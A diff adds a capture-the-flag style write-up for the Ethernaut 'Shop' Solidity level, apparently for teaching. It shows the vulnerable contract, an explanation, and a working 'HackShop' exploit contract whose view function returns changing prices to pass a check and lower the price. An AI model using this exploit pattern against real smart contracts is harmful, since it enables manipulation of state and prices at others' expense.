@@ -1024,3 +1024,58 @@ If you're going to implement this technique, make sure you don't miss the nonce 
 ```
 ##### Takeaway from Ethernaut
 
+# 21. Shop
+### Challenge
+- Make the price value less than defined.
+### Purpose
+The danger of trusting an interface without knowing the actual implementation.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+```
+### Solution
+##### Explanation
+This is similar to [Elevator](#11-elevator). The `Shop` contract trusts the sender blindly. We need to create a contract that has view `price()` which bypasses the condition `_buyer.price() >= price` first, then gives a lower value for the price call.
+##### Exploit
+```
+contract HackShop {
+    Shop private immutable target;
+
+    constructor(Shop _target) {
+        target = _target;
+    }
+
+    function attack() external {
+        target.buy();
+        require(target.price() == 50, "Attack failed!");
+    }
+
+    function price() external view returns (uint) {
+        return target.isSold()? 50: 100;
+    }
+}
+```
+1. Deploy the above contract with the `Shop` instance.
+2. Call `attack()` to reduce the price value.
+##### Takeaway from Ethernaut
+Contracts can manipulate data seen by other contracts in any way they want.\
+It's unsafe to change the state based on external and untrusted contracts logic.
